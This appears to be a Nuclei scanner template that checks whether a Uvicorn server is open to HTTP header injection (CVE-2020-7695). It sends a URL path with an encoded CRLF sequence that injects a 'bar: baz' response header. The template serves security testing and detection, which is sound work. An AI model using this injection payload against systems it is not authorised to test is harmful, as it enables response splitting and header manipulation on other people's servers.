http:
- extractors:
  - name: injected_header
    part: header
    regex:
    - bar:\s*baz
    type: regex
  matchers:
  - part: header
    regex:
    - (?i)bar:\s*baz
    type: regex
  - status:
    - 200
    - 404
    - 403
    - 401
    - 500
    type: status
  - condition: or
    part: header
    type: word
    words:
    - uvicorn
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/foo%0d%0abar:%20baz'
id: uvicorn-header-injection
info:
  author: nvsecurity
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N
    cvss-score: 5.3
    cwe-id: CWE-113
  description: 'Uvicorn server is vulnerable to HTTP header injection through URL
    path encoding.

    This vulnerability allows an attacker to inject additional HTTP response headers

    by using CRLF sequences in the URL path.

    '
  metadata:
    max-request: 1
    product: Uvicorn
    verified: true
  name: Uvicorn HTTP Header Injection
  reference:
  - https://nvd.nist.gov/vuln/detail/CVE-2020-7695
  - https://security.snyk.io/vuln/SNYK-PYTHON-UVICORN-570471
  - https://github.com/advisories/GHSA-f97h-2pfx-f59f
  severity: medium
  tags: crlf,injection,uvicorn,headers
